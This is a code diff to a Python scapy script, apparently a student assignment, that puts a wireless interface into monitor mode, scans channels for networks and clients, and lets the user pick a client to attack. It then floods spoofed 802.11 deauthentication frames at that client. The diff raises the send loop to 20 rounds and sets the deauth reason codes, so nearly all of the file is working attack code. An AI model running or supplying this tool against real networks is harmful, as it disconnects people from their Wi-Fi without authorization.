@@ -1,3 +1,5 @@
+from time import sleep
+
 import netifaces
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap
@@ -8,6 +10,7 @@ network_list = {}
 This class represents an object of type Network of wireless network
 '''
 
+
 class Network:
     def __init__(self, bssid, mac, chanel):
         self.bssid = bssid
@@ -16,7 +19,7 @@ class Network:
         self.users = []
 
     def net_info(self):
-        return f"{self.bssid} {self.mac}"
+        return f"bssid: {self.bssid}, MAC:{self.mac}, channel: {self.chanel}"
 
     def get_users(self):
         return self.users
@@ -38,18 +41,22 @@ def iface_list():
     if_list = netifaces.interfaces()
     return if_list
 
+
 '''
 Set interface into monitor mode
 '''
+
 
 def monitorMode(iface):
     os.system("ifconfig " + iface + " down")
     os.system("iwconfig " + iface + " mode monitor")
     os.system("ifconfig " + iface + " up")
 
+
 '''
 Handels the packet caught by the interface by seperating it to sender and reciver packets
 '''
+
 
 def packet_handler(pkt):
     if pkt.haslayer(Dot11Beacon):
@@ -78,22 +85,19 @@ def start_sniffer(interface):
     os.system("clear")
     for channel in range(1, 13):
         os.system("iwconfig %s channel %d" % (interface, channel))
-        sniff(iface=interface, timeout=2, prn=packet_handler) #change timeout to 5 before subbmiting
+        sniff(iface=interface, timeout=2, prn=packet_handler)  # change timeout to 5 before subbmiting
 
 
 def perform_deauth(router, client, iface):
-    pckt = RadioTap()/Dot11(addr1=client, addr2=router, addr3=router) / Dot11Deauth()
-    cli_to_ap_pckt = RadioTap()/Dot11(addr1=router, addr2=client, addr3=client) / Dot11Deauth()
+    pckt = RadioTap() / Dot11(addr1=client, addr2=router, addr3=router) / Dot11Deauth(reason=4)
+    cli_to_ap_pckt = RadioTap() / Dot11(addr1=router, addr2=client, addr3=client) / Dot11Deauth(reason=7)
 
     print('Sending Deauth to ' + client + ' from ' + router)
 
     try:
-        for i in range(5):
-            # Send out deauth from the AP
+        for i in range(20):
             sendp(pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=0)
-            # If we're targeting a client, we will also spoof deauth from the client to the AP
-            sendp(cli_to_ap_pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=0)
-
+            #sendp(cli_to_ap_pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=0)
 
     except Exception as e:
         print(f"error: {e}")
@@ -101,28 +105,30 @@ def perform_deauth(router, client, iface):
 
 if __name__ == '__main__':
     # Display all available interface
+    user_iface = None
+
     print("Available interfaces:")
     if_list = iface_list()
-    for i in range(1, len(if_list)):
-        print(i, if_list[i])
+    for i in range(0, len(if_list)):
+        print(i+1, if_list[i])
+    flag = True
+    while (flag):
+        user_choice = input("Please pick an interface:\n ")
+        while int(user_choice) < 1 or int(user_choice) > len(if_list):
+            user_choice = input("Interface has to be in the range seen above\nPlease pick an interface from the "
+                                "listed numbers")
 
+        print(user_choice)
+        user_iface = if_list[int(user_choice)-1]
 
-    user_choice = input("Please pick an interface:\n ")
-    while (1):
+        print('Setting interface into monitor mode...\n')
         try:
-            validated = int(user_choice)
-            if user_choice < 1 or user_choice > len(if_list):
-                raise Exception("Interface has to be in the range seen above")
-            break
+            monitorMode(user_iface)
+            flag = False
         except:
-            user_choice = input("Please pick an interface from the listed numbers\n ")
+            print("Could not change interface mode to monitor.")
 
-    user_iface = if_list[int(user_choice)]
-
-    print('Setting interface into monitor mode')
-    monitorMode(user_iface)
-
-    # Checking and displaying available networks - per 13 chanels
+    # Checking and displaying available networks
     print("Sniffing for available networks for 60 seconds...")
     start_sniffer(user_iface)
     for net in range(0, len(network_list)):
@@ -132,14 +138,9 @@ if __name__ == '__main__':
 
     # let user pick network - check number is valid
     user_choice = input("Please pick a network: \n")
-    while 1:
-        try:
-            validated = int(user_choice)
-            if user_choice < 1 or user_choice > len(if_list):
-                raise Exception("Interface has to be in the range seen above")
-            break
-        except:
-            user_choice = input("Please pick an interface from the listed numbers\n ")
+    while int(user_choice) < 1 or int(user_choice) > len(network_list):
+        user_choice = input("Network has to be in the range seen above\n Please pick an network from the listed numbers")
+
     user_key = list(network_list)[int(user_choice) - 1]
     user_network = network_list.get(user_key)
 
@@ -151,9 +152,11 @@ if __name__ == '__main__':
 
     # let user pick who to attak
     user_choice = input("please pick a client to attack: \n")
-    client_to_attack = user_network.get_users()[int(user_choice)-1]
+    while int(user_choice) < 1 or int(user_choice) > len(user_network.get_users()):
+        user_choice = input("User has to be in the range seen above\n Please pick a user from the listed numbers")
+
+    client_to_attack = user_network.get_users()[int(user_choice) - 1]
     print(f"will be attacking {client_to_attack}\n")
 
     # deauth
     perform_deauth(user_network.get_mac(), client_to_attack, user_iface)
-
